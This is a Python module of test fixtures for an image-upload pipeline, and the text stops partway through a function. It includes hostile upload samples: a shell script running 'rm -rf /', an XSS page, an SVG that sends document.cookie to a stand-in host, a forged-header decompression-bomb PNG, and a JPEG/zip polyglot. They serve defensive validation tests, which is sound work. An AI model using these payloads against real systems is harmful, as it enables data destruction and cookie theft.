"""Test doubles and fixture builders for the upload path.

These ship with the package rather than living in ``vision/tests`` because the
acceptance criteria on this feature are stated in terms of them, and because the
FastAPI app (issue #66) will want the same store double for its own route tests
rather than reinventing one.

:class:`StubImageAnalyzer` is here for the same reason: stage 3 fails closed,
and "fails closed" is only a claim a test can settle if the test can make
Content Safety unreachable on demand without reaching Azure to do it.

:class:`ScriptedStream` and :class:`TricklingStream` are here for the abuse work
in issue #80. "The read is bounded" and "a body that never ends is cut off" are
claims about *how much was read* and *how long it took*, and neither is
assertable against a ``BytesIO``: one has no cost and the other never lies about
its length. These two count their reads and charge a clock, so a test can settle
both without waiting for real seconds to pass.

:func:`menu_catalog` builds a :class:`~chip_chat.catalog.records.MenuCatalog`
out of the same fixture terms :func:`generated_vocabulary` renders a module
from, so that a stage-4 answer and the stage-5 catalogue it resolves against
always come from one build. Building it from the real record classes rather than
mirroring them is possible here because ``chip-chat-vision`` depends on
``chip-chat-catalog`` for the matcher -- there is nothing to keep in step.

:func:`photo_with_location` is the interesting one. "EXIF is stripped" is only
a meaningful assertion if the fixture actually had EXIF to lose, and only a
*sufficient* assertion if the fixture also had the other places a camera writes
location: XMP, and a JPEG comment. This builder attaches all three, so a test
that finds none of them afterwards has proven something.
"""

import json
import struct
import textwrap
import threading
import zlib
from collections.abc import Iterator, Mapping, Sequence
from contextlib import contextmanager
from dataclasses import dataclass, field
from datetime import UTC, datetime
from decimal import Decimal
from io import BytesIO
from types import ModuleType
from typing import Any

from PIL import Image

from chip_chat.catalog.records import (
    AllergenDisclosure,
    Derivation,
    ItemPrice,
    MenuCatalog,
    MenuItem,
    Modifier,
    Slot,
    VocabularyTerm,
)
from chip_chat.otel import ToolName, agent_step, tool_call
from chip_chat.vision.moderation import ModerationUnavailableError, SafetyCategory
from chip_chat.vision.store import BlobRef
from chip_chat.vision.vocabulary import Vocabulary

__all__ = [
    "COMPARISON_RESTAURANT",
    "DEFAULT_TERMS",
    "DESCRIBED_MEAL",
    "ELF_BINARY",
    "GPS_LATITUDE_DEGREES",
    "GZIP_ARCHIVE",
    "HTML_PAGE",
    "PDF_DOCUMENT",
    "REFERENCE_RESTAURANT",
    "SHELL_SCRIPT",
    "SVG_WITH_SCRIPT",
    "XMP_LOCATION_MARKER",
    "ZIP_ARCHIVE",
    "AsyncScriptedStream",
    "InMemoryBlobStore",
    "ManualMonotonic",
    "ScriptedStream",
    "StoredBlob",
    "StubImageAnalyzer",
    "StubVisionModel",
    "TricklingStream",
    "generated_vocabulary",
    "jpeg_signed_but_not_jpeg",
    "jpeg_with_appended_archive",
    "menu_catalog",
    "photo_tool_call",
    "photo_with_location",
    "png_declaring",
    "published",
    "safe_severities",
    "solid_image",
    "vocabulary_module",
    "vocabulary_module_source",
]

GPS_LATITUDE_DEGREES = 41
"""The degrees field of the fixture's GPS tag. Recognisable in a raw byte scan."""

XMP_LOCATION_MARKER = b"exif:GPSLatitude"
"""A string that appears in the fixture's XMP packet and nowhere else."""

JPEG_COMMENT = b"chip-chat-fixture-comment"
"""A JPEG COM segment, the third place metadata hides."""


@dataclass(frozen=True, slots=True)
class StoredBlob:
    """One blob an :class:`InMemoryBlobStore` was asked to write."""

    name: str
    data: bytes
    content_type: str


class InMemoryBlobStore:
    """A :class:`~chip_chat.vision.store.BlobStore` that keeps writes in a dict.

    Refuses to overwrite, exactly as the Azure one does, so a test that expects
    unique names is actually testing for them.
    """

    __slots__ = ("_blobs", "_container", "_lock")

    def __init__(self, container: str = "uploads") -> None:
        """Initialise the store.

        Args:
            container: The container name reported to callers.
        """
        self._container = container
        self._lock = threading.Lock()
        self._blobs: dict[str, StoredBlob] = {}

    @property
    def container(self) -> str:
        return self._container

    def put(self, name: str, data: bytes, *, content_type: str) -> None:
        with self._lock:
            if name in self._blobs:
                raise FileExistsError(name)
            self._blobs[name] = StoredBlob(
                name=name, data=data, content_type=content_type
            )

    def read(self, ref: BlobRef) -> bytes:
        """Return one blob's bytes, as a
        :class:`~chip_chat.vision.store.BlobReader` does.

        Args:
            ref: The reference stage 3 produced.

        Returns:
            The stored bytes.

        Raises:
            KeyError: If nothing was written under that name.
            ValueError: If the ref names a different container -- the same
                refusal the Azure reader makes, so a test that relies on it is
                testing the real behaviour.
        """
        if ref.container != self._container:
            raise ValueError(
                f"{ref} is not in this store's container ({self._container})"
            )
        return self.get(ref).data

    def get(self, ref: BlobRef | str) -> StoredBlob:
        """Read one blob back.

        Args:
            ref: The reference, or a bare blob name.

        Returns:
            What was written.

        Raises:
            KeyError: If nothing was written under that name.
        """
        name = ref.name if isinstance(ref, BlobRef) else ref
        with self._lock:
            return self._blobs[name]

    @property
    def names(self) -> tuple[str, ...]:
        """Every blob written, in write order."""
        with self._lock:
            return tuple(self._blobs)

    def __len__(self) -> int:
        with self._lock:
            return len(self._blobs)


def safe_severities() -> dict[str, int]:
    """Every category at zero -- what Content Safety says about a burrito bowl."""
    return {category.value: 0 for category in SafetyCategory}


class StubImageAnalyzer:
    """An :class:`~chip_chat.vision.moderation.ImageAnalyzer` that answers from a script.

    Records what it was handed, so a test can assert that stage 3 saw the
    *normalized* bytes rather than what was uploaded -- which is how "moderation
    runs after normalization" stops being a comment and becomes an assertion.
    """

    __slots__ = ("_severities", "_unavailable", "calls")

    def __init__(
        self,
        severities: Mapping[str, int] | None = None,
        *,
        unavailable: bool = False,
    ) -> None:
        """Initialise the analyzer.

        Args:
            severities: What to report, keyed by category name. Defaults to
                :func:`safe_severities`. Pass a partial mapping to exercise the
                "the service answered with a hole in it" path.
            unavailable: Raise
                :class:`~chip_chat.vision.moderation.ModerationUnavailableError`
                instead of answering, which is the outage stage 3 must fail
                closed on.
        """
        self._severities = safe_severities() if severities is None else dict(severities)
        self._unavailable = unavailable
        self.calls: list[bytes] = []

    def analyze(self, image: bytes) -> Mapping[str, int]:
        self.calls.append(image)
        if self._unavailable:
            raise ModerationUnavailableError("content safety is unreachable")
        return dict(self._severities)


def solid_image(
    size: tuple[int, int] = (64, 48),
    *,
    fmt: str = "JPEG",
    colour: tuple[int, int, int] = (120, 90, 60),
    mode: str = "RGB",
) -> bytes:
    """Encode a plain rectangle, with no metadata attached.

    Args:
        size: ``(width, height)`` in pixels.
        fmt: A Pillow format name -- ``JPEG``, ``PNG``, ``WEBP``.
        colour: The fill.
        mode: The image mode; ``RGBA`` to exercise the transparency path.

    Returns:
        The encoded bytes.
    """
    fill: tuple[int, ...] = colour if mode == "RGB" else (*colour, 255)
    image = Image.new(mode, size, fill)
    buffer = BytesIO()
    image.save(buffer, format=fmt)
    return buffer.getvalue()


def photo_with_location(
    size: tuple[int, int] = (64, 48), *, orientation: int = 1
) -> bytes:
    """Encode a JPEG carrying location data in all three places a camera writes it.

    EXIF GPS tags, an XMP packet, and a JPEG comment. A normalized copy of this
    that still contains any of them has not had its metadata stripped, whatever
    :meth:`~PIL.Image.Image.getexif` reports.

    Args:
        size: ``(width, height)`` in pixels.
        orientation: The EXIF orientation tag to record. 6 means "rotate 90
            degrees clockwise to display", which is what a phone held upright
            writes, and is the value that proves the transpose ran.

    Returns:
        The encoded JPEG bytes.
    """
    image = Image.new("RGB", size, (200, 40, 40))
    # One corner in a different colour, so a transpose is visible in the pixels
    # rather than only in a tag that the transpose is supposed to remove.
    image.paste((20, 20, 220), (0, 0, max(1, size[0] // 4), max(1, size[1] // 4)))

    exif = Image.Exif()
    exif[0x0112] = orientation  # Orientation
    exif[0x010F] = "ChipChatFixtures"  # Make
    exif[0x8825] = {  # GPSInfo
        1: "N",
        2: (GPS_LATITUDE_DEGREES, 52, 0),
        3: "W",
        4: (87, 37, 0),
    }

    xmp = (
        b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:exif="http://ns.adobe.com/exif/1.0/" '
        b'exif:GPSLatitude="41,52.000000N" exif:GPSLongitude="87,37.000000W"/>'
        b'</rdf:RDF></x:xmpmeta><?xpacket end="w"?>'
    )

    buffer = BytesIO()
    image.save(
        buffer,
        format="JPEG",
        exif=exif,
        xmp=xmp,
        comment=JPEG_COMMENT,
        quality=95,
    )
    return buffer.getvalue()


# --- payloads that are not photographs ---------------------------------------
#
# Each one is something a real upload endpoint gets sent. They are built here
# rather than checked in as files so that what makes each one dangerous is
# legible in the source rather than in a hexdump. Issue #80 wants the same set.

ZIP_ARCHIVE = b"PK\x03\x04" + b"\x00" * 60
"""A zip. The classic thing to name ``holiday.jpg``."""

GZIP_ARCHIVE = b"\x1f\x8b\x08\x00" + b"\x00" * 32

ELF_BINARY = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
"""A Linux executable, in case anything downstream is ever tempted to run it."""

SHELL_SCRIPT = b"#!/bin/sh\nrm -rf /\n"

HTML_PAGE = b"<!DOCTYPE html><html><body><script>alert(1)</script></body></html>"
"""Served back with the wrong content type, this is stored XSS."""

SVG_WITH_SCRIPT = (
    b'<?xml version="1.0"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b"<script>fetch('https://example.invalid/'+document.cookie)</script>"
    b"</svg>"
)
"""The dangerous one.

SVG genuinely is an image format, browsers render it, and it can carry script
and remote references. It also has no magic number -- it is XML -- so a check
that asks "does this parse as an image" rather than "does this start with a
signature we allow" is exactly the check that lets it through.
"""

PDF_DOCUMENT = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n" + b"\x00" * 32
"""A real document, in a format the pipeline still does not decode."""


def png_declaring(width: int, height: int) -> bytes:
    """Build a tiny PNG whose header claims to be ``width`` by ``height``.

    The decompression bomb, in its honest form: the file is a few hundred bytes,
    the IHDR chunk is truthful PNG, and opening it the naive way asks for the
    memory the header describes. Patching a real PNG's header -- and fixing the
    chunk CRC, so nothing rejects it as merely corrupt -- is how you get a
    fixture that is dangerous for the right reason.

    Args:
        width: The width to declare.
        height: The height to declare.

    Returns:
        PNG bytes with a valid, and enormous, IHDR.
    """
    buffer = BytesIO()
    Image.new("L", (1, 1), 0).save(buffer, format="PNG")
    raw = bytearray(buffer.getvalue())

    # 8-byte signature, then a chunk: 4-byte length, 4-byte type, data, 4-byte CRC.
    # IHDR is always first and always 13 bytes: width, height, then five fields.
    ihdr_data = 8 + 4 + 4
    raw[ihdr_data : ihdr_data + 8] = struct.pack(">II", width, height)
    chunk = bytes(raw[ihdr_data - 4 : ihdr_data + 13])
    raw[ihdr_data + 13 : ihdr_data + 17] = struct.pack(">I", zlib.crc32(chunk))
    return bytes(raw)


# --- stage 4: the vocabulary, the model, and the span it must sit under -------
#
# The describe stage has no vocabulary of its own -- it loads one the catalogue
# build wrote -- so a test of it needs a generated module to load. These build
# one without a catalogue, a landing zone or a network.

DEFAULT_TERMS: Mapping[str, tuple[str, ...]] = {
    "vessel": ("bowl", "burrito"),
    "protein": ("chicken", "steak"),
    "rice": ("white_rice",),
    "beans": ("black_beans",),
    "salsas": ("fresh_tomato_salsa",),
    "toppings": ("cheese", "guacamole"),
}
"""A small vocabulary in the shape a real catalogue produces.

These are fixture terms, not a vocabulary anything ships with: the point of
:func:`generated_vocabulary` is that a test can hand the describer *any*
vocabulary and watch what it accepts change. ``tests/test_describe.py`` uses a
second, deliberately different one to prove exactly that.
"""


def vocabulary_module_source(
    terms: Mapping[str, Sequence[str]] | None = None,
    *,
    content_version: str = "0" * 64,
) -> str:
    """Render a module in the shape ``chip_chat.catalog.vocabulary`` writes.

    Mirrors ``render_module`` there: the same docstring header carrying the
    catalogue content version, one :class:`~enum.StrEnum` per slot, ``SLOT_ITEMS``
    and ``DESCRIBE_SCHEMA``. It is a mirror rather than a call because
    ``chip-chat-vision`` does not depend on ``chip-chat-catalog`` -- the
    generated module is loaded by name at runtime, not imported -- and a test
    fixture that reached for the generator would reintroduce the dependency the
    design removes. ``tests/fixtures/generated-vocabulary.py.txt`` is a copy of
    the real generator's output, and ``tests/test_vocabulary.py`` loads it, so
    the mirror is checked against the thing it mirrors.

    Args:
        terms: Slot name to the terms it publishes. Defaults to
            :data:`DEFAULT_TERMS`. A slot mapped to no terms renders an empty
            enum, which is what a catalogue with no salsa rows produces.
        content_version: The catalogue build to record in the docstring.

    Returns:
        Python source for a generated vocabulary module.
    """
    published = DEFAULT_TERMS if terms is None else terms
    lines = [
        '"""The vision model\'s slot vocabulary, generated from the catalogue.',
        "",
        "DO NOT EDIT. This module is written by ``chip_chat.catalog.vocabulary``.",
        "",
        "Catalogue content version:",
        f"    {content_version}",
        '"""',
        "",
        "from enum import StrEnum",
        "",
    ]
    for slot, values in published.items():
        lines.append(f"\n\nclass {_fixture_class(slot)}(StrEnum):")
        lines.append(f'    """Published {slot} the model may return."""')
        lines.append("")
        if not values:
            lines.append("    # The catalogue published no term for this slot.")
            lines.append("    pass")
            continue
        for value in values:
            lines.append(f"    {value.upper()} = {json.dumps(value)}")

    lines.append("\n\nSLOT_ITEMS: dict[str, dict[str, tuple[str, ...]]] = {")
    for slot, values in published.items():
        lines.append(f"    {json.dumps(slot)}: {{")
        for index, value in enumerate(values):
            resolves = "()" if slot in ("vessel", "protein") else f'("CMG-{index}",)'
            lines.append(f"        {json.dumps(value)}: {resolves},")
        lines.append("    },")
    lines.append("}")

    lines.append(
        textwrap.dedent(
            '''

            def _slot(values: list[str]) -> dict[str, object]:
                """One slot: a value from the catalogue, and how sure the model is."""
                return {
                    "type": "object",
                    "additionalProperties": False,
                    "required": ["value", "confidence"],
                    "properties": {
                        "value": {"type": "string", "enum": values},
                        "confidence": {
                            "type": "number", "minimum": 0, "maximum": 1
                        },
                    },
                }


            DESCRIBE_SCHEMA: dict[str, object] = {
                "type": "object",
                "additionalProperties": False,
                "required": ["is_chipotle_style", "meals_visible"],
                "properties": {
                    "is_chipotle_style": {"type": "boolean"},'''
        )
    )
    for slot in ("vessel", "protein", "rice", "beans"):
        values = list(published.get(slot, ()))
        lines.append(f"        {json.dumps(slot)}: _slot({json.dumps(values)}),")
    for slot in ("salsas", "toppings"):
        values = list(published.get(slot, ()))
        lines.append(
            f"        {json.dumps(slot)}: "
            f'{{"type": "array", "items": _slot({json.dumps(values)})}},'
        )
    lines.append('        "meals_visible": {"type": "integer", "minimum": 0},')
    lines.append('        "notes": {"type": "string"},')
    lines.append("    },")
    lines.append("}")
    return "\n".join(lines) + "\n"


def _fixture_class(slot: str) -> str:
    """Class name for a slot, the way the generator spells it."""
    stem = slot[:-1] if slot.endswith("s") else slot
    return "".join(part.capitalize() for part in stem.split("_"))


def vocabulary_module(
    source: str, name: str = "chip_chat_vision_vocabulary"
) -> ModuleType:
    """Execute generated source as a module, without writing a file.

    Args:
        source: Module source, from :func:`vocabulary_module_source` or read
            from a file the real generator wrote.
        name: The module's ``__name__``, which appears in
            :class:`~chip_chat.vision.vocabulary.VocabularyError` messages.

    Returns:
        The module, ready for
        :meth:`~chip_chat.vision.vocabulary.Vocabulary.from_module`.
    """
    module = ModuleType(name)
    exec(compile(source, f"<{name}>", "exec"), module.__dict__)
    return module


def generated_vocabulary(
    terms: Mapping[str, Sequence[str]] | None = None,
    *,
    content_version: str = "0" * 64,
) -> Vocabulary:
    """Build a :class:`~chip_chat.vision.vocabulary.Vocabulary` from fixture terms.

    Args:
        terms: Slot name to the terms it publishes. Defaults to
            :data:`DEFAULT_TERMS`.
        content_version: The catalogue build to record.

    Returns:
        The vocabulary, exactly as loading a generated module would produce it.
    """
    return Vocabulary.from_module(
        vocabulary_module(
            vocabulary_module_source(terms, content_version=content_version)
        )
    )


DESCRIBED_MEAL: Mapping[str, Any] = {
    "is_chipotle_style": True,
    "vessel": {"value": "bowl", "confidence": 0.94},
    "protein": {"value": "chicken", "confidence": 0.71},
    "rice": {"value": "white_rice", "confidence": 0.55},
    "beans": {"value": "black_beans", "confidence": 0.38},
    "salsas": [{"value": "fresh_tomato_salsa", "confidence": 0.62}],
    "toppings": [
        {"value": "cheese", "confidence": 0.83},
        {"value": "guacamole", "confidence": 0.29},
    ],
    "meals_visible": 1,
    "notes": "Looks like a generous scoop of everything.",
}
"""A well-formed stage-4 response over :data:`DEFAULT_TERMS`.

The confidences are deliberately all different. A fixture that answered 1.0 nine
times would make the calibration check in ``tests/test_describe.py`` pass for the
wrong reason, and would be the very shape issue #53's fourth acceptance criterion
is written to catch.
"""


@dataclass
class StubVisionModel:
    """A :class:`~chip_chat.vision.describe.VisionModel` that answers from a script.

    Records every call, so a test can assert what the describer actually sent --
    that the response format reached the API rather than the prompt, that the
    image bytes were the stored ones, that the prompt named no catalogue term.
    """

    response: str | None = None
    """The raw text to return. ``None`` means :data:`DESCRIBED_MEAL` as JSON.

    An empty *string* is a different thing and is passed through: a deployment
    that answers with nothing is a case stage 4 has to handle, and a stub that
    quietly substituted a good answer for it would hide that.
    """

    deployment: str = "gpt-4.1-mini-test"
    error: Exception | None = None
    """Raise this instead of answering -- the outage stage 4 must decline on."""

    calls: list[dict[str, Any]] = field(default_factory=list)

    def __post_init__(self) -> None:
        if self.response is None:
            self.response = json.dumps(DESCRIBED_MEAL)

    def describe(
        self,
        *,
        image: bytes,
        media_type: str,
        response_format: Mapping[str, Any],
        system_prompt: str,
        user_prompt: str,
    ) -> str:
        self.calls.append(
            {
                "image": image,
                "media_type": media_type,
                "response_format": response_format,
                "system_prompt": system_prompt,
                "user_prompt": user_prompt,
            }
        )
        if self.error is not None:
            raise self.error
        return self.response or ""


@contextmanager
def photo_tool_call(ref: BlobRef | str, *, step: int = 0) -> Iterator[None]:
    """Open the spans RFC-001 section 09 puts above ``vision.describe``.

    ``vision.describe`` is a child of ``tool.<tool_name>``, which is a child of
    ``agent.step``, and :mod:`chip_chat.otel` enforces that rather than
    documenting it -- so a test that calls
    :meth:`~chip_chat.vision.describe.MealDescriber.describe` outside one gets a
    :class:`~chip_chat.otel.spans.SpanSchemaError`. That is the schema working.
    This is what stops every such test from having to say so.

    Args:
        ref: The photograph the tool was called on. Recorded as the tool's
            argument, which is the *only* thing that crosses that boundary.
        step: The ``agent.step`` index.

    Yields:
        Nothing; the spans are the point.
    """
    with (
        agent_step(index=step),
        tool_call(ToolName.MATCH_MEAL_FROM_PHOTO, arguments={"image_ref": str(ref)}),
    ):
        yield


def jpeg_with_appended_archive(size: tuple[int, int] = (64, 48)) -> bytes:
    """A genuine JPEG with a zip glued to its tail: the classic polyglot.

    Every gate in stage 1 passes it, and correctly so -- the signature is a
    JPEG's, the header parses as a JPEG's, and the declared dimensions are a
    photograph's. Refusing it would mean refusing every photograph with a
    trailing byte, which is a lot of real photographs.

    What handles it is stage 2, structurally rather than by inspection:
    :func:`~chip_chat.vision.normalize.normalize` writes a new JPEG from pixel
    data, so anything that was not a pixel is not copied. A test asserts on the
    *stored* bytes, which is the only place the claim can be settled.

    Args:
        size: ``(width, height)`` of the carrier photograph.

    Returns:
        JPEG bytes with :data:`ZIP_ARCHIVE` appended.
    """
    return solid_image(size, fmt="JPEG") + ZIP_ARCHIVE


def jpeg_signed_but_not_jpeg(size: tuple[int, int] = (32, 24)) -> bytes:
    """A file that signs itself JPEG and decodes as a different format.

    Built as an MPO -- a multi-picture container that opens with a JPEG's
    signature and that Pillow resolves as ``MPO`` rather than ``JPEG``. It is
    the cheapest honest way to produce the disagreement
    :func:`~chip_chat.vision.validate.validate` refuses on: the bytes say one
    format and the decoder says another, which is what a disguised payload
    looks like from inside.

    Args:
        size: ``(width, height)`` of each frame.

    Returns:
        MPO bytes beginning with a JPEG signature.
    """
    first = Image.new("RGB", size, (120, 90, 60))
    second = Image.new("RGB", size, (60, 90, 120))
    buffer = BytesIO()
    first.save(buffer, format="MPO", append_images=[second])
    return buffer.getvalue()


class ManualMonotonic:
    """A monotonic clock a test moves by hand, callable where one is wanted.

    :func:`~chip_chat.vision.reader.read_upload` takes its clock as a callable
    so that "this upload took too long" is something a test asserts rather than
    something it waits for.
    """

    __slots__ = ("seconds",)

    def __init__(self, start: float = 0.0) -> None:
        """Initialise the clock.

        Args:
            start: The instant it reads at first.
        """
        self.seconds = start

    def __call__(self) -> float:
        return self.seconds

    def advance(self, seconds: float) -> None:
        """Move the clock forward.

        Args:
            seconds: How far.
        """
        self.seconds += seconds


class ScriptedStream:
    """A finite byte stream that counts its reads and can charge for them.

    :attr:`reads` is the point of the class. "The ceiling stopped the read"
    means the reader asked for a bounded number of chunks and then stopped, and
    a ``BytesIO`` cannot tell you whether it did -- it hands over twenty
    megabytes as cheerfully as it hands over one.
    """

    __slots__ = ("_chunk_size", "_clock", "_data", "_offset", "_seconds", "reads")

    def __init__(
        self,
        data: bytes,
        *,
        chunk_size: int = 64 * 1024,
        seconds_per_read: float = 0.0,
        clock: ManualMonotonic | None = None,
    ) -> None:
        """Initialise the stream.

        Args:
            data: What it will eventually deliver.
            chunk_size: The most it returns from one read, whatever was asked
                for -- a real socket does the same.
            seconds_per_read: How far ``clock`` moves per read.
            clock: The clock to charge. Required if ``seconds_per_read`` is set.
        """
        self._data = data
        self._chunk_size = chunk_size
        self._seconds = seconds_per_read
        self._clock = clock
        self._offset = 0
        self.reads = 0

    @property
    def bytes_delivered(self) -> int:
        """How much of :attr:`_data` the reader actually took."""
        return self._offset

    def read(self, size: int, /) -> bytes:
        """Return the next chunk, charging the clock for it."""
        self.reads += 1
        if self._clock is not None and self._seconds:
            self._clock.advance(self._seconds)
        end = self._offset + min(size, self._chunk_size)
        chunk = self._data[self._offset : end]
        self._offset = end
        return chunk


class AsyncScriptedStream:
    """:class:`ScriptedStream` with an awaitable ``read``, for the async reader.

    Delegates rather than subclasses, so the two readers are exercised against
    one set of behaviour instead of two that can drift.
    """

    __slots__ = ("_inner",)

    def __init__(self, inner: ScriptedStream) -> None:
        """Wrap a scripted stream.

        Args:
            inner: The stream to delegate to.
        """
        self._inner = inner

    @property
    def reads(self) -> int:
        """How many times the reader asked for bytes."""
        return self._inner.reads

    async def read(self, size: int, /) -> bytes:
        """Return the next chunk from the wrapped stream."""
        return self._inner.read(size)


class TricklingStream:
    """A body that never ends: a few bytes per read, a clock tick per read.

    The slow upload of issue #80, which is invisible to every size ceiling --
    eight mebibytes at one byte a second is under an eight mebibyte limit for
    ninety-seven days. What refuses it is the deadline, and this is the stream
    that proves the deadline is there.
    """

    __slots__ = ("_chunk", "_clock", "_seconds", "reads")

    def __init__(
        self,
        clock: ManualMonotonic,
        *,
        chunk: bytes = b"\x00",
        seconds_per_read: float = 1.0,
    ) -> None:
        """Initialise the stream.

        Args:
            clock: The clock each read moves forward.
            chunk: What each read returns. Never empty, which is the point.
            seconds_per_read: How far the clock moves per read.
        """
        self._clock = clock
        self._chunk = chunk
        self._seconds = seconds_per_read
        self.reads = 0

    def read(self, size: int, /) -> bytes:
        """Return :attr:`_chunk`, forever, charging the clock each time."""
        self.reads += 1
        self._clock.advance(self._seconds)
        return self._chunk[:size]


# --- stage 5: a catalogue to resolve against ---------------------------------
#
# The matcher needs a menu, and a menu that came from a different build than the
# vocabulary is the drift `MealMatcher` raises on. So both are built here from
# one set of terms: `generated_vocabulary(terms)` renders what the model may
# say, and `menu_catalog(terms)` publishes rows for exactly those terms.

REFERENCE_RESTAURANT = 679
"""The fixture catalogue's reference restaurant."""

COMPARISON_RESTAURANT = 1200
"""A second restaurant, priced higher.

Money is per restaurant because Chipotle's really is, so a fixture with one
restaurant in it cannot tell a matcher that quotes the right prices from one
that quotes the only prices it has.
"""

_HARVESTED_AT = datetime(2026, 1, 1, 12, 0, tzinfo=UTC)
_MENU_URL = "https://services.chipotle.test/menu"
_COMPARISON_MARKUP = Decimal("1.20")
"""What the second restaurant charges, as a multiple of the first."""

_ENTREE_SLOTS = (Slot.VESSEL, Slot.PROTEIN)

_DERIVATIONS: Mapping[Slot, Derivation] = {
    Slot.VESSEL: Derivation.ITEM_TYPE,
    Slot.PROTEIN: Derivation.PRIMARY_FILLING,
    Slot.RICE: Derivation.MODIFIER_TYPE,
    Slot.BEANS: Derivation.MODIFIER_TYPE,
    Slot.SALSAS: Derivation.NAME_SUFFIX,
    Slot.TOPPINGS: Derivation.MODIFIER_TYPE,
}
"""How each slot's terms are derived, spelled the way the real build spells it."""


def published(term: str) -> str:
    """Return the published name a fixture term stands for.

    The inverse of ``chip_chat.catalog.vocabulary.slug`` for terms simple enough
    to have one, which every fixture term is. It exists so that the vocabulary
    row's ``name`` and the ``menu_items`` column the matcher joins it to are the
    same string for the same reason they are in a real build -- one derivation,
    not two spellings.

    Args:
        term: A vocabulary term, e.g. ``white_rice``.

    Returns:
        The published name, e.g. ``White Rice``.
    """
    return " ".join(part.capitalize() for part in term.split("_"))


def menu_catalog(
    terms: Mapping[str, Sequence[str]] | None = None,
    *,
    without: Sequence[tuple[str, str]] = (),
    unpriced: Sequence[str] = (),
) -> MenuCatalog:
    """Build a catalogue publishing rows for exactly ``terms``.

    Every vessel term crossed with every protein term is an entree, which is
    what makes ``without`` useful: a real menu sells a Chicken Bowl and a Steak
    Burrito and no Steak Bowl, and "two real terms, no real row" is the case the
    matcher must refuse rather than round off.

    Every modifier term is published under **one item identifier per vessel**,
    the way Chipotle publishes guacamole under one identifier on a burrito and
    another on a taco. The vocabulary row carries both as candidates and the
    ``modifiers`` table decides which one a given entree means, so a matcher
    that resolved a term without consulting the entree would land on the wrong
    row and price it wrong.

    Args:
        terms: Slot name to the terms it publishes. Defaults to
            :data:`DEFAULT_TERMS`, so ``menu_catalog()`` and
            ``generated_vocabulary()`` describe one build.
        without: ``(vessel term, protein term)`` pairs the menu does not sell.
        unpriced: Terms and vessel terms whose items get no ``item_prices`` row
            at all, for the case where a total cannot honestly be quoted.

    Returns:
        The catalogue.
    """
    published_terms = DEFAULT_TERMS if terms is None else terms
    vessels = tuple(published_terms.get(Slot.VESSEL.value, ()))
    proteins = tuple(published_terms.get(Slot.PROTEIN.value, ()))
    excluded = set(without)

    items: list[MenuItem] = []
    modifiers: list[Modifier] = []
    vocabulary: list[VocabularyTerm] = []
    priced: dict[str, Decimal] = {}
    unpriced_terms = set(unpriced)

    for vessel in vessels:
        vocabulary.append(_term(Slot.VESSEL, vessel, ()))
    for protein in proteins:
        vocabulary.append(_term(Slot.PROTEIN, protein, ()))

    entrees: dict[str, str] = {}
    for index, (vessel, protein) in enumerate(
        (vessel, protein) for vessel in vessels for protein in proteins
    ):
        if (vessel, protein) in excluded:
            continue
        item_id = f"CMG-{100 + index}"
        entrees[item_id] = vessel
        items.append(
            _menu_item(
                item_id=item_id,
                name=f"{published(protein)} {published(vessel)}",
                category="Entree",
                item_type=published(vessel),
                primary_filling=published(protein),
                composed=True,
            )
        )
        if vessel not in unpriced_terms:
            priced[item_id] = Decimal("9.00") + index

    for slot in (Slot.RICE, Slot.BEANS, Slot.SALSAS, Slot.TOPPINGS):
        for offset, term in enumerate(published_terms.get(slot.value, ())):
            candidates: list[str] = []
            for position, vessel in enumerate(vessels):
                modifier_item_id = (
                    f"CMG-{5000 + 100 * _SLOT_ORDER[slot] + 10 * offset + position}"
                )
                candidates.append(modifier_item_id)
                items.append(
                    _menu_item(
                        item_id=modifier_item_id,
                        name=published(term),
                        category=None,
                        item_type=published(slot.value),
                        primary_filling=None,
                        composed=False,
                    )
                )
                if term not in unpriced_terms:
                    priced[modifier_item_id] = Decimal("0.50") * position + offset
                for entree_id, entree_vessel in entrees.items():
                    if entree_vessel != vessel:
                        continue
                    modifiers.append(
                        _modifier(entree_id, modifier_item_id, published(term), slot)
                    )
            vocabulary.append(_term(slot, term, tuple(sorted(candidates))))

    prices = [
        ItemPrice(
            restaurant_id=restaurant,
            item_id=item_id,
            unit_price=amount * markup,
            unit_delivery_price=amount * markup * Decimal("1.30"),
            is_available=True,
            eligible_for_delivery=True,
            source_url=_MENU_URL,
            harvested_at=_HARVESTED_AT,
        )
        for restaurant, markup in (
            (REFERENCE_RESTAURANT, Decimal(1)),
            (COMPARISON_RESTAURANT, _COMPARISON_MARKUP),
        )
        for item_id, amount in sorted(priced.items())
    ]

    return MenuCatalog(
        reference_restaurant_id=REFERENCE_RESTAURANT,
        restaurant_ids=(REFERENCE_RESTAURANT, COMPARISON_RESTAURANT),
        menu_items=tuple(items),
        item_prices=tuple(prices),
        modifiers=tuple(modifiers),
        stores=(),
        item_allergens=(),
        allergens=(),
        caveats=(),
        vocabulary=tuple(vocabulary),
    )


_SLOT_ORDER: Mapping[Slot, int] = {
    Slot.RICE: 0,
    Slot.BEANS: 1,
    Slot.SALSAS: 2,
    Slot.TOPPINGS: 3,
}
"""Keeps each slot's fixture identifiers in their own block, for legible failures."""


def _menu_item(
    *,
    item_id: str,
    name: str,
    category: str | None,
    item_type: str,
    primary_filling: str | None,
    composed: bool,
) -> MenuItem:
    """One ``menu_items`` row, with the provenance every real row carries."""
    return MenuItem(
        item_id=item_id,
        name=name,
        category=category,
        item_type=item_type,
        primary_filling=primary_filling,
        description=None,
        calories=None,
        is_composed=composed,
        allergens=(),
        allergen_disclosure=AllergenDisclosure.NOT_PUBLISHED,
        source_url=_MENU_URL,
        harvested_at=_HARVESTED_AT,
        nutrition_source_url=None,
        nutrition_harvested_at=None,
        allergen_source_url=None,
        allergen_harvested_at=None,
    )


def _modifier(item_id: str, modifier_item_id: str, name: str, slot: Slot) -> Modifier:
    """One ``modifiers`` row joining a modifier item to the entree offering it."""
    return Modifier(
        modifier_id=f"{item_id}:{modifier_item_id}",
        item_id=item_id,
        modifier_item_id=modifier_item_id,
        name=name,
        slot=slot,
        derivation=_DERIVATIONS[slot],
        group_name=None,
        modifier_type=published(slot.value),
        min_quantity=None,
        max_quantity=None,
        is_default=False,
        delta_calories=None,
        portion_options=(),
        source_url=_MENU_URL,
